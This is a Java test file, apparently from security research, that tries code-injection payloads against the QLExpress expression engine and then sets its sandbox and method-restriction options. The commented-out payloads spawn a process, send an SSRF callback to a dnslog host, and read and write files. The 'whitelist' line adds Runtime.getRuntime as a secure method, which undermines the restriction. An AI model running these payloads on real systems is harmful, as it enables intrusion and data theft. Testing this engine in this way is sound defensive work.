package com.example;

import com.ql.util.express.DefaultContext;
import com.ql.util.express.ExpressRunner;
import com.ql.util.express.config.QLExpressRunStrategy;

public class QLExpressTest {
    public static void main(String[] args) throws Exception {

        /*
        //runtime命令注入
        String code = "Runtime.getRuntime().exec('calc');";
        ExpressRunner expressRunner = new ExpressRunner();
        expressRunner.execute(code, new DefaultContext<>(), null, false, true);
        */

        /*
        //SSRF
        String code = "import java.net.URL;" +"import java.net.URLConnection;" +"URLConnection url = new URL(\"http://n5gm6i.dnslog.cn\").openConnection();" +"resp = url.getResponseCode();" +"resp;";;
        ExpressRunner expressRunner = new ExpressRunner();
        System.out.println(expressRunner.execute(code, new DefaultContext<>(), null, false, true));
        */

        //读
        //String code = "import java.io.BufferedReader;n" +"import java.io.FileReader;n" +"FileReader f=new FileReader(\"/tmp/flag\");n" +"BufferedReader a=new BufferedReader(f);n" +"String str=a.readLine();n" +"System.out.println(str);";
        //写
        //String code = "import java.io.*;n" +"BufferedWriter out = new BufferedWriter(new FileWriter(\"/tmp/test\"));n" +"out.write(\"success\");n" +"out.close();";

        //黑名单校验
        QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);
        //白名单校验
        QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);QLExpressRunStrategy.addSecureMethod(Runtime.class, "getRuntime");
        // 开启沙箱模式
        QLExpressRunStrategy.setSandBoxMode(true);
    }
}
